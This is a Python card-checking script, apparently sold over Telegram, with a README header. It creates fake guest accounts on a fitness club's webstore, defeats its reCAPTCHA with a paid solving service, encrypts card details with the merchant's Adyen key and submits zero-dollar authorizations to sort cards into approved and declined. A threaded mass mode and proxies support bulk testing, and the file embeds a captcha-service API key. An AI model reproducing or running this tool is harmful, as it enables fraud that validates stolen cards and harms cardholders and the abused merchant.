
#! =====================================================================================
#! [⚠️] README — SUITECOMMERCE CHECKOUT | NETSUITE FLOW (US)
#! =====================================================================================
#*
#* Author: Ghost © Sxgitario Gateway API Service
#* Project: Gateway API
#* Gateway: Recurly CCN Auth
#* Region: US (& Global) 🇺🇸
#* Requirements: pip install faker colorama curl-cffi boto3 botocore pycognito
#*
#? -------------------------------------------------------------------------------------
#?  CONFIGURATION
#? -------------------------------------------------------------------------------------
#! (MASS) - Usage for mass mode --------------------------
#*
#* - proxy: (Optional) user:pass@ip:port
#*      • If not specified, no proxy will be used
#*
#* This mode allows you to process multiple cards simultaneously.
#* You can provide a file containing card details, and the program will
#* attempt to process each card in a threaded manner, printing the results
#* to the console one by one.
#*
#* Example:
#*   gate = Core(proxy = None) #user:pass@ip:port (optional)
#*   gate.mass("ccs.txt") # Card file
#*      - Ensure "ccs.txt" contains the cards in the format: "ccnum|mm|yyyy|cvv"
#*      - Results will be printed to the console for each card processed.
#*
#! (SIMPLE) - Usage for simple mode (one card) ----------
#* This mode is designed for processing a single card.
#* You need to provide the card details in the format: "ccnum|mm|yyyy|cvv"
#* The proxy is optional; if not specified, no proxy will be used.
#*
#* Example:
#*   gate = Core(
#*       card  = "5154621375967748|05|2029|000",
#*       proxy = None #user:pass@ip:port (optional)
#*   )
#*   response = gate.json() # Fetches the response in JSON format
#*   print(response) # Prints the response to the console
#*     (EXTRA) print(gate) # Prints a formatted string output
#*
#? -------------------------------------------------------------------------------------
#?  SUPPORT / CONTACT
#? -------------------------------------------------------------------------------------
#* Telegram (SHOP): https://t.me/Sxgitario
#* Telegram (DEV):  https://t.me/Ghost_ofcc
#* Telegram (SELLER): https://t.me/Sxgittal
#*
#? Thank you for using Sxgitario Gateway API Service ✨
#? Happy coding — and may NetSuite not break your flow 🚀
#! =====================================================================================

from urllib import response
import time, random, re, json, types, os, secrets, string, base64, uuid
from faker import Faker
from colorama import Fore
from curl_cffi import requests as curl
from concurrent.futures import ThreadPoolExecutor
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives.ciphers.aead import AESCCM
import pytz
from datetime import datetime
from os import urandom

class encryptor:
    def __init__(self, adyen_public_key, adyen_version='_0_1_8', adyen_prefix='adyenjs'):
        self.adyen_public_key = adyen_public_key
        self.adyen_version = adyen_version
        self.adyen_prefix = adyen_prefix

    def encrypt_field(self, name: str, value: str):
        plain_card_data = self.field_data(name, value)
        card_data_json_string = json.dumps(plain_card_data, sort_keys=True)
        aes_key = self.generate_aes_key()
        nonce = self.generate_nonce()
        encrypted_card_data = self.encrypt_with_aes_key(aes_key, nonce, bytes(card_data_json_string, encoding='utf-8'))
        encrypted_card_component = nonce + encrypted_card_data
        public_key = self.decode_adyen_public_key(self.adyen_public_key)
        encrypted_aes_key = self.encrypt_with_public_key(public_key, aes_key)
        return "{}{}${}${}".format(self.adyen_prefix,
                                   self.adyen_version,
                                   base64.standard_b64encode(encrypted_aes_key).decode(),
                                   base64.standard_b64encode(encrypted_card_component).decode())

    def encrypt_card(self, card: str, cvv: str, month: str, year: str):
        data = {
            'card': self.encrypt_field('number', card),
            'cvv': self.encrypt_field('cvc', cvv),
            'month': self.encrypt_field('expiryMonth', month),
            'year': self.encrypt_field('expiryYear', year),
        }
        return data

    def field_data(self, name, value):
        generation_time = datetime.now(tz=pytz.timezone('UTC')).strftime('%Y-%m-%dT%H:%M:%S.000Z')
        return {name: value, "generationtime": generation_time}

    def encrypt_from_dict(self, dict_: dict):
        card_data_json_string = json.dumps(dict_, sort_keys=True)
        aes_key = self.generate_aes_key()
        nonce = self.generate_nonce()
        encrypted_card_data = self.encrypt_with_aes_key(aes_key, nonce, bytes(card_data_json_string, encoding='utf-8'))
        encrypted_card_component = nonce + encrypted_card_data
        public_key = self.decode_adyen_public_key(self.adyen_public_key)
        encrypted_aes_key = self.encrypt_with_public_key(public_key, aes_key)
        return "{}{}${}${}".format(self.adyen_prefix,
                                   self.adyen_version,
                                   base64.standard_b64encode(encrypted_aes_key).decode(),
                                   base64.standard_b64encode(encrypted_card_component).decode())

    @staticmethod
    def decode_adyen_public_key(encoded_public_key):
        key_components = encoded_public_key.split("|")
        public_number = rsa.RSAPublicNumbers(int(key_components[0], 16), int(key_components[1], 16))
        return public_number.public_key(default_backend())

    @staticmethod
    def encrypt_with_public_key(public_key, plaintext):
        return public_key.encrypt(plaintext, asym_padding.PKCS1v15())

    @staticmethod
    def generate_aes_key():
        return AESCCM.generate_key(256)

    @staticmethod
    def encrypt_with_aes_key(aes_key, nonce, plaintext):
        cipher = AESCCM(aes_key, tag_length=8)
        return cipher.encrypt(nonce, plaintext, None)

    @staticmethod
    def generate_nonce():
        return urandom(12)


class Core:

    #TODO: Public Data & Methods - Constants, Initializer, JSON Output, Mass Handler
    CARD_TYPE_MAP = {'4': 'visa', '5': 'master-card', '3': 'amex', '6': 'discover'}
    EMAIL_DOMAINS = ('gmail.com', 'outlook.com')
    TITLE_MESSAGE = f"\n{Fore.LIGHTGREEN_EX}b.Vxsilisk {Fore.LIGHTWHITE_EX} / {Fore.LIGHTMAGENTA_EX}Atlas v0.5{Fore.LIGHTWHITE_EX} / {Fore.LIGHTCYAN_EX}Sxgitario ~ Api Gateway Services{Fore.LIGHTWHITE_EX}"
    RESPONSES_MAP = ['N7 : Decline for CVV2 failure', 'Balance', '82 : Negative CAM, dCVV, iCVV, CVV, or CAVV results', 'Card Approved']
    json = lambda self: self.responseGate

    def __init__(self, card: str = None, proxy: bool = None, test: bool = False) -> None:
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            #//TODO: Public Attributes
            self.card = self.__parseCard(card) if card else None
            self.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

            if self.card:
                #//TODO: Process Billing Flow
                gate = self.__processBillingFlow()
                None if test else self.__makeResponse(gate)

        except Exception as e:
            self.raise_message = str(e); del self


    def mass(self, file_combo: str = "ccs.txt") -> None:
        print(self.TITLE_MESSAGE)
        if not os.path.isfile(file_combo):
            self.raise_message = f"File not found: {file_combo}"
            del self; return

        with open(file_combo, 'r') as f:    
            cards = (line.strip() for line in f if line.strip())
            cards = [card for card in cards if card]
            with ThreadPoolExecutor(max_workers = 10) as executor: list(executor.map(self.__massHandler, cards))


    #TODO: Private Methods - Helper Functions
    __extractBetween = lambda self, text, startToken, endToken: text.split(startToken)[1].split(endToken)[0]
    __decodeBase64   = lambda self, data: base64.b64decode(data).decode('utf-8')

    def __massHandler(self, card:str) -> None:
        response = self.__processBillingFlow(cardData = card)
        massResponse = self.__makeResponse(response, mass = True)
        text =  f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Card: {Fore.LIGHTBLUE_EX}{massResponse.get('card')}\n"
        text += f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX if massResponse.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX} INFO {Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Status: {Fore.LIGHTGREEN_EX if massResponse.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX}{massResponse.get('apiResponse')}\n"
        text += f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX if massResponse.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX} INFO {Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Response: {Fore.LIGHTGREEN_EX if massResponse.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX}{massResponse.get('response')}\n"
        #text += f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX if massResponse.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX} INFO {Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}AVS: {Fore.LIGHTGREEN_EX if massResponse.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX}{massResponse.get('avs')} {Fore.LIGHTBLUE_EX}| {Fore.LIGHTWHITE_EX}CVV: {Fore.LIGHTGREEN_EX if massResponse.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX}{massResponse.get('cvv')}\n"
        print(text)
    
    def __solveCaptcha(self, siteKey: str, url: str, session) -> str:
        key = globals().get('CAPSOLVER_KEY') or os.getenv('CAPSOLVER_KEY')
        if not key:
            raise RuntimeError('CAPSOLVER_KEY is not set (module variable or environment)')

        def _resp_text(resp):
            try:
                t = resp.text
                return t() if callable(t) else t
            except Exception:
                try:
                    return resp.text()
                except Exception:
                    return ''

        create_payload = {
            'clientKey': key,
            "task": {
                "type": "RecaptchaV2TaskProxyless",
                "websiteURL": url,
                "websiteKey": siteKey,
            }
        }



        resp = session.post('https://api.capsolver.com/createTask', json=create_payload, timeout=10)
        # intentar parsear JSON primero, fallback a texto
        taskid = None
        try:
            j = resp.json()
            taskid = j.get('taskId') or j.get('task_id')
        except Exception:
            pass

        if not taskid:
            txt = _resp_text(resp)
            try:
                taskid = int(txt.split('"taskId":')[1].split(',')[0])
            except Exception:
                raise RuntimeError(f'Failed to create captcha task: {txt}')

        # Poll for result with timeout
        timeout = 60
        poll = 2
        elapsed = 0
        get_payload = {'clientKey': key, 'taskId': taskid}

        while elapsed < timeout:
            r = session.post('https://api.capsolver.com/getTaskResult', json=get_payload, timeout=10)
            # intentar JSON
            try:
                rj = r.json()
            except Exception:
                rtxt = _resp_text(r)
                if '"status":"ready"' in rtxt and '"gRecaptchaResponse":"' in rtxt:
                    try:
                        return rtxt.split('"gRecaptchaResponse":"')[1].split('"')[0]
                    except Exception:
                        raise RuntimeError('Captcha ready but failed to parse token (text)')
                time.sleep(poll)
                elapsed += poll
                continue
            
            status = rj.get('status')
            if status == 'ready':
                # solución esperada en 'solution' o directamente en la respuesta
                solution = rj.get('solution') or rj
                token = None
                if isinstance(solution, dict):
                    token = solution.get('gRecaptchaResponse') or solution.get('gRecaptcha') or solution.get('gRecaptchaToken')
                if not token:
                    # fallback a texto
                    rtxt = _resp_text(r)
                    if '"gRecaptchaResponse":"' in rtxt:
                        try:
                            token = rtxt.split('"gRecaptchaResponse":"')[1].split('"')[0]
                        except Exception:
                            pass
                if token:
                    return token
                raise RuntimeError(f'Captcha ready but token missing: {rj}')

            # si hay error explícito
            if rj.get('errorId') not in (None, 0) or rj.get('error'):
                raise RuntimeError(f'Captcha provider error: {rj}')

            time.sleep(poll)
            elapsed += poll

        raise RuntimeError('Timeout waiting for captcha result')
    
    def __parseCard(self, card: str) -> dict[str, str]:
        cardNumber, expiryMonth, expiryYear, cvv = re.split(r'\s*[|/]\s*|\s+', card)
        expiryYear = f"20{expiryYear}" if len(expiryYear) == 2 else expiryYear
        return {'number': cardNumber, 'month': expiryMonth.zfill(2), 'year': expiryYear, 'cvv': cvv, 'type': self.CARD_TYPE_MAP[cardNumber[0]]}

    def __generateFakeProfile(self) -> types.SimpleNamespace:
        fake, p = Faker("en_US"), Faker("en_US").profile()
        firstName, lastName = p['name'].split()[0], p['name'].split()[-1]
        password = f"{''.join(secrets.choice(string.ascii_uppercase) for _ in range(2))}" f"{''.join(secrets.choice(string.ascii_lowercase) for _ in range(4))}" f"{''.join(secrets.choice(string.digits) for _ in range(3))}@"
        return types.SimpleNamespace(status = True, f_name = firstName, l_name = lastName, gender = p['sex'], username = f"{firstName}{lastName}{random.randint(0,999):03}", password = password, phone = fake.phone_number(), mail = f"{firstName}{random.choice('._-')}{lastName}{random.randint(0,999)}@{random.choice(self.EMAIL_DOMAINS)}", country = fake.country(), state = fake.state(), city = fake.city(), zipcode = fake.postcode(), street = f"{fake.building_number()} {fake.street_name()}")

    def __del__(self) -> None:
        if hasattr(self, 'raise_message') == False: return
        print(self.TITLE_MESSAGE + "\n")
        print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX} ERROR {Fore.LIGHTWHITE_EX}] {Fore.LIGHTRED_EX}Malformed object deleted. {Fore.LIGHTWHITE_EX}({Fore.LIGHTRED_EX} {self.raise_message} {Fore.LIGHTWHITE_EX})")

    def __makeResponse(self, data: dict, mass: bool = False) -> None:
        apiResponse = 'Declined ❌'
        for r in self.RESPONSES_MAP: 
            if r in data.get('message'): 
                apiResponse = 'Approved ✅'; break
        if mass: return {'status': data.get('status'), 'success': data.get('success'), 'response': data.get('message'), 'apiResponse': apiResponse, 'avs': data.get('avs'), 'cvv': data.get('cvv'), 'card': data.get('card'), 'gateway': 'Adyen Auth', 'powered-by': 'Sxgitario ~ Api Gateway Services'}
        self.responseGate = {'status': data.get('status'), 'success': data.get('success'), 'response': data.get('message'), 'apiResponse': apiResponse, 'card': f"{self.card['number']}|{self.card['month']}|{self.card['year']}|{self.card['cvv']}", 'gateway': 'Adyen Auth', 'powered-by': 'Sxgitario ~ Api Gateway Services'}

    def __str__(self):
        text = self.TITLE_MESSAGE + "\n"
        text += f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Card: {Fore.LIGHTBLUE_EX}{self.responseGate.get('card')}\n"
        text += f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Gateway: {Fore.LIGHTBLUE_EX}{self.responseGate.get('gateway')}\n"
        text += f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX if self.responseGate.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX} INFO {Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Status: {Fore.LIGHTGREEN_EX if self.responseGate.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX}{self.responseGate.get('apiResponse')}\n"
        text += f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX if self.responseGate.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX} INFO {Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Response: {Fore.LIGHTGREEN_EX if self.responseGate.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX}{self.responseGate.get('response')}\n"
        #text += f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX if self.responseGate.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX} INFO {Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}AVS: {Fore.LIGHTGREEN_EX if self.responseGate.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX}{self.responseGate.get('avs')} {Fore.LIGHTBLUE_EX}| {Fore.LIGHTWHITE_EX}CVV: {Fore.LIGHTGREEN_EX if self.responseGate.get('apiResponse') == 'Approved ✅' else Fore.LIGHTRED_EX}{self.responseGate.get('cvv')}\n"
        text += f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Securities: {Fore.LIGHTBLUE_EX}Clean\n"
        return text

    def generate_temporary_password(self):
        lower  = string.ascii_lowercase
        upper  = string.ascii_uppercase
        digits = string.digits
        special = "!@#$%^&*"
        
        chars = [
            random.choice(lower),
            random.choice(upper),
            random.choice(digits),
            random.choice(special),
        ]
        
        pool = lower + upper + digits + special
        chars += [random.choice(pool) for _ in range(8)]  # 4→12
        
        random.shuffle(chars)
        return "".join(chars)


    def __processBillingFlow(self, cardData:str = None, retries: int = 0) -> None:
        cards   = self.__parseCard(cardData) if cardData else self.card
        session = curl.Session(impersonate = random.choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
        session.proxies = self.proxies
        session.verify  = False
        info = self.__generateFakeProfile()
        email = str(uuid.uuid4())[:8] + "@gmail.com"

        try:

            one = cards['number'][:1]
            if one == "4":
                        tipo = "visa"
            elif one == "5":
                        tipo = "mc"
            elif one == "3":
                        tipo = "amex"
            elif one == "6":
                        tipo = "discover"

            a = {"4":"Visa"}.get("4")


            r0 = session.get("https://join.franklinhealthandfitness.com/webstoreNew/ebccaee1-c895-43da-908a-666d0307b4e8")
            bearer = r0.text.split('"webApiToken":"')[1].split('"')[0]
                    
            password = self.generate_temporary_password()

            phone = f"551{str(random.randint(1000000, 9999999))}"

            headers = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-language': 'es-419,es;q=0.9',
                        'application_name': 'Webstore V2',
                        'application_version': '1.0.0',
                        'authorization': f'bearer {bearer}',
                        'content-type': 'application/json',
                        'origin': 'https://join.franklinhealthandfitness.com',
                        'priority': 'u=1, i',
                        'referer': 'https://join.franklinhealthandfitness.com/',
                        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Linux"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'cross-site',
                        'sec-gpc': '1',
                        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                        'x-languagecode': 'en-US',
                    }

                    # PASO 2 — Register guest
            json_data = {
                        'VerificationId': '',
                        'OTP': '',
                        'ignoreOTP': True,
                        'IgnoreGuestSettings': True,
                        'LoginSource': 0,
                        'SocialLoginUserId': None,
                        'SocialLoginUserToken': None,
                        'CenterId': 'ebccaee1-c895-43da-908a-666d0307b4e8',
                        'Guest': {
                            'FirstName': info.f_name,
                            'LastName': info.l_name,
                            'UserName': email,
                            'Password': password,
                            'Email': email,
                            'MobileNumber': info.phone,
                            'Gender': '',
                            'Address1': info.street,
                            'Address2': '',
                            'City': info.city,
                            'State': {'Id': 67, 'Code': 'US36', 'Name': 'New York', 'ShortName': 'NY'},
                            'Country': {'Id': 225, 'Code': 'US', 'Name': 'United States', 'PhoneCode': 1, 'Nationality': 'American', 'PhoneRange': '10'},
                            'PostalCode': info.zipcode,
                            'DateOfBirth': '1985-01-17 12:00:00',
                            'DOB_IncompleteYear': None,
                            'ReceiveMarketingEmail': False,
                            'ReceiveMarketingSms': False,
                            'MobilePhoneModel': {'CountryId': 225, 'Number': phone, 'DisplayNumber': f'+1 { phone }'},
                            'ProfilePictureUrl': None,
                            'IdpUserId': None,
                            'IdpAccessToken': None,
                            'ReferralCode': '',
                            'email': email,
                            'firstName': info.f_name,
                            'lastName': info.l_name,
                            'phone': {'CountryId': 225, 'DisplayNumber': f'+1 { phone}', 'Number': phone, 'PhoneCode': 1, 'Name': 'United States', 'PhoneRange': '10'},
                            'dateOfBirth': '01/17/1985',
                            'address1': info.street,
                            'address2': '',
                            'postalCode': info.zipcode,
                            'city': info.city,
                            'state': '67',
                            'country': '225',
                            'GuestPreferredPronoun': '',
                            'fromV3MembershipOtpRegistration': True,
                        },
                        'IdpUserInfo': {'LoginProvider': 0, 'IdpUserId': None, 'IdpUserToken': None},
                        'RecaptchaResponse': '',
                        'issignUpWithOtpFlow': False,
                    }
                    
            r1 = session.post('https://apiamrs22.zenoti.com/api/Catalog/Guests/Register', headers=headers, json=json_data)

  
            userID = r1.text.split('{"Id":"')[1].split('"')[0]

            headers = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-language': 'es-419,es;q=0.7',
                        'application_name': 'Webstore V2',
                        'application_version': '1.0.0',
                        'authorization': f'bearer {bearer}',
                        'content-type': 'application/json',
                        'origin': 'https://join.franklinhealthandfitness.com',
                        'priority': 'u=1, i',
                        'referer': 'https://join.franklinhealthandfitness.com/webstoreNew/sales/membership/ebccaee1-c895-43da-908a-666d0307b4e8',
                        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Linux"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'sec-gpc': '1',
                        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                        # 'cookie': 'MMSRequestContext=cbfad16c-f6d4-45c5-bb32-3d70977d08e0; MMSContext=ContextId=cbfad16c-f6d4-45c5-bb32-3d70977d08e0; Zenoti_Browser_Context=1a19e740-279f-4661-bdf0-2269d97d5eb0; _WebstoreInitTriggered=true; globalLanguagePreferences_franklin={"userPreference":"en-US","centerPreference":"en-US","orgPreference":"en-US"}; LastAccessedTime=2026-04-09 03:22:23',
                    }

            json_data = {
                        'userName': email,
                        'userPass': password,
                        'login_provider': 0,
                        'idp_user_id': '',
                        'idp_user_token': '',
                        'userOtp': None,
                        'verificationId': None,
                        'isUserClickingLogin': False,
                        'rememberMe': False,
                        'formsRequestId': '',
                        'gpcEnabled': None,
                        'recaptchaResponse': '',
                    }

            response = session.post(
                        'https://join.franklinhealthandfitness.com/WebStore/WebStoreServices.aspx/WebstoreV2SignIn',
                headers=headers,
                json=json_data,
                    )

                    

            resp = response.text.replace('\\', '')

            bearer = resp.split('"webApiToken":"')[1].split('"')[0]


            captcha = self.__solveCaptcha('6LeqVwEgAAAAAPzbMEjYkvMQbRaqjdGSlg_hYa-e', 'https://join.franklinhealthandfitness.com/', session)
            headers = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-language': 'es-419,es;q=0.7',
                        'application_name': 'Webstore V2',
                        'application_version': '1.0.0',
                        'authorization': f'bearer {bearer}',
                        'content-type': 'application/json',
                        'origin': 'https://join.franklinhealthandfitness.com',
                        'priority': 'u=1, i',
                        'referer': 'https://join.franklinhealthandfitness.com/',
                        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Linux"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'cross-site',
                        'sec-gpc': '1',
                        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                        'x-languagecode': 'en-US',
                    }

            json_data = {
                        'center_id': 'ebccaee1-c895-43da-908a-666d0307b4e8',
                        'user_id': userID,
                        'membership_version_ids': '1c87b9f1-e37c-4ecc-9152-3e658789b18c',
                        'recaptcha_response': captcha,
                        'source_url': 'https://join.franklinhealthandfitness.com/webstoreNew/sales/membership/ebccaee1-c895-43da-908a-666d0307b4e8',
                        'sales_emp_id': None,
                        'abandoned_invoice_id': None,
                    }

            response = session.post('https://apiamrs22.zenoti.com/api/Catalog/Memberships/CreateInvoice', headers=headers, json=json_data)



            headers = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-language': 'es-419,es;q=0.5',
                        'application_name': 'Webstore V2',
                        'application_version': '1.0.0',
                        'authorization': f'bearer {bearer}',
                        'content-type': 'application/json',
                        'origin': 'https://join.franklinhealthandfitness.com',
                        'priority': 'u=1, i',
                        'referer': 'https://join.franklinhealthandfitness.com/',
                        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Linux"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'cross-site',
                        'sec-gpc': '1',
                        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                        'x-languagecode': 'en-US',
                    }



                    # PASO 3 — InitializeSaveCard
            json_data = {
                        'transactionDetails': {
                            'PaymentaccountID': '',
                            'Source': 1,
                            'transactionType': 1,
                            'SaveCard': True,
                            'Protocol': 'https',
                            'ShareCardsToWeb': True,
                            'host': 'join.franklinhealthandfitness.com',
                            'CenterId': 'ebccaee1-c895-43da-908a-666d0307b4e8',
                            'GuestName': None,
                            'ProcessorId': 'Adyen',
                            'UserId': userID,
                            'readersource': 1,
                            'FirstRecurringCharge': True,
                        },
                        'billingInfo': {
                            'Address1': info.street,
                            'City': info.city,
                            'CountryCode': 'US',
                            'Email': email,
                            'Name': f"{info.f_name} {info.l_name}",
                            'FirstName': info.f_name,
                            'LastName': info.l_name,
                            'Phone': f'+1 {phone}',
                            'State': info.state,
                            'HouseNumberOrName': '',
                            'Zipcode': info.zipcode,
                        },
                        'shippingInfo': {},
                        'browser_info': {
                            'userAgent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                            'acceptHeader': 'application/json',
                            'language': 'es-419',
                            'colorDepth': 24,
                            'screenHeight': 1050,
                            'screenWidth': 1680,
                            'timeZoneOffset': 300,
                            'javaEnabled': False,
                        },
                        'payment_validation_key': None,
                        'AvsSource': 1,
                    }
            r2 = session.post(
                        'https://apiamrs22.zenoti.com/api/Catalog/Payments/Guest/InitializeSaveCard',
                headers=headers,
                json=json_data,
                    )

            urlref   = r2.text.split('"HostedPaymentURL":"')[1].split('"')[0]
            tokenFK  = r2.text.split('"TokenFK":"')[1].split('"')[0]
            signature = r2.text.split('&signature=')[1].split('"')[0]

                    # PASO 4 — Encrypt card & ProcessTransaction
            ADYEN_KEY = "10001|D5AE1F89EE111A47DE65E2AB87C5A66243B994BE7449A0748062C5B8940F27583ACFB48E8398DD8A2180BB1E1136B93CC47A7258312FCAD16AE9308970E7DB5DD326F53D0023E47D5A399C343EA4E212AC9C369830B2381F3C44B951D8B9A1E7DE1FF03D78EF1C136D569F2C6CE1D5FF89E999D540D9953D985A01652570CC5B64F96F8A6D0A7749D2F256746A20CFFA4F5BE2BEC4ABC11572F5FF0DBF556C38FA742206A8A05589116A27BB5F455CF3E2F769F74B1D0B7E28EFB5C0DB1A71267EA4B7F3A9025428045772C638573B79DCCFED84DB36085C78E6ECA22A50842EC8A327EE4C7309B9F5C80E4B97343468E08AE047B4170BD4D4C8203AE2352A49"
            enc = encryptor(ADYEN_KEY)
            enc.adyen_version = '_0_1_25'
            card = enc.encrypt_card(card=cards['number'], cvv=cards['cvv'], month=cards['month'], year=cards['year'])

            headers2 = {
                        'accept': 'application/json, text/javascript, */*; q=0.01',
                        'accept-language': 'es-419,es;q=0.9',
                        'content-type': 'application/json; charset=UTF-8',
                        'origin': 'https://join.franklinhealthandfitness.com',
                        'priority': 'u=1, i',
                        'referer': urlref,
                        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Linux"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'sec-gpc': '1',
                        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                        'x-languagecode': 'en-US',
                        'x-requested-with': 'XMLHttpRequest',
                    }
            json_data = {
                        'processorId': 'Adyen',
                        'subscriberId': 'ebccaee1-c895-43da-908a-666d0307b4e8',
                        'transactionSource': 'WebStore',
                        'paymentRequest': {
                            'paymentMethod': {
                                'type': 'scheme',
                                'holderName': f"{info.f_name} {info.l_name}",
                                'encryptedCardNumber': card['card'],
                                'encryptedExpiryMonth': card['month'],
                                'encryptedExpiryYear': card['year'],
                                'encryptedSecurityCode': card['cvv'],
                            },
                            'type': 'scheme',
                            'reference': tokenFK,
                            'BrowserInformation': {
                                'acceptHeader': '*/*',
                                'colorDepth': 24,
                                'language': 'es-419',
                                'javaEnabled': False,
                                'screenHeight': 1050,
                                'screenWidth': 1680,
                                'userAgent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                                'timeZoneOffset': 300,
                            },
                            'shopperLocale': 'en-US',
                            'signature': signature,
                            'channel': 'web',
                            'amount': {'currency': 'USD', 'value': '0'},
                            'brand': tipo,
                            'FirstRecurringCharge': '0',
                        },
                    }
            response = session.post(
                        'https://join.franklinhealthandfitness.com/OnlinePayments/AdyentHPP.aspx/ProcessTransaction',
                headers=headers2,
                json=json_data,
                    )
            r3 = response.text.replace('\\', '')
   

            if '"Success":true' in r3:
                return {'status': True, 'success': True, 'message': 'Card Approved', 'card': f"{cards['number']}|{cards['month']}|{cards['year']}|{cards['cvv']}"} 
            else:
                mensaje = r3.split('The issuer bank has declined the transaction with reason "')[1].split('"')[0]

                return {'status': False, 'success': False, 'message': mensaje, 'card': f"{cards['number']}|{cards['month']}|{cards['year']}|{cards['cvv']}"}
        except Exception as error:
            print(f"Error en la linea {error.__traceback__.tb_lineno}: {str(error)}")
            if retries < 0: return self.__processBillingFlow(cardData = cardData, retries = retries + 1)
            else: return {'status': False, 'success': False, 'message': f"Error en la linea {error.__traceback__.tb_lineno}: {str(error)}", 'card': f"{cards['number']}|{cards['month']}|{cards['year']}|{cards['cvv']}"}




CAPSOLVER_KEY="CAP-6F804ECBCD1553B80215A27EC3DAA29B"


gate = print(Core(card = input("Card: "),proxy = None,).gate())